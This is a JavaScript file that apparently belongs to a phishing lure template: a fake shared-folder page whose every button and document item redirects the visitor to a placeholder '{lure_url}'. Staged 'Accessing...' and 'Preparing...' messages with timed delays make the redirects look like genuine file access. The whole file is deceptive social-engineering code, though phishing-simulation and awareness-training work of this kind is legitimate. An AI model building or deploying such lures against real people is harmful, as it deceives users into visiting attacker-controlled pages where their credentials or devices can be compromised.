function openDocument() {
    window.location.href = '{lure_url}';
}

function accessFolder() {
    const btn = document.querySelector('.btn-primary');
    btn.innerHTML = '<span>Accessing...</span>';
    btn.disabled = true;
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 1200);
}

function downloadFolder() {
    const btn = document.querySelector('.btn-secondary');
    btn.innerHTML = '<span>Preparing...</span>';
    btn.disabled = true;
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 1500);
}

document.querySelectorAll('.doc-item').forEach(item => {
    item.addEventListener('click', (e) => {
        if (!e.target.classList.contains('btn-view')) {
            window.location.href = '{lure_url}';
        }
    });
});

document.addEventListener('DOMContentLoaded', () => {
    const items = document.querySelectorAll('.doc-item');
    items.forEach((item, index) => {
        item.style.opacity = '0';
        item.style.transform = 'translateX(-20px)';
        setTimeout(() => {
            item.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
            item.style.opacity = '1';
            item.style.transform = 'translateX(0)';
        }, index * 100);
    });
});
